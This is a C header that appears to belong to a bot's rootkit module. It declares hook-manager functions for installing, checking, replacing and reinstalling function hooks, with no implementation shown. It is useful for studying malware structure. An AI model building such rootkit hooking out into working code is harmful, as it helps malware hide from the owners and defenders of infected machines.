#pragma once
#include "modules.h"

#ifdef MODULE_ROOTKIT
#include "..\common\bot_structs.h"
#include "..\common\hooking.h"

void WINAPI HookManagerThreadSyncBegin(void);
void WINAPI HookManagerThreadSyncFinish(void);

void WINAPI InitHookManager(void);
void WINAPI AddHook(hook_t hook);
BOOL WINAPI IsAddressHooked(LPVOID lpAddress);
BYTE* WINAPI GetOriginalByAddress(LPVOID lpAddress, PDWORD pdwLength);
DWORD WINAPI GetHookCount(void);
BOOL WINAPI IsHookManipulated(DWORD iIndex);
void WINAPI ReplaceFunction(DWORD dwFunctionAddress, const BYTE* pBuffer, DWORD dwLength);
void WINAPI ReinstallHook(DWORD dwIndex);

#endif;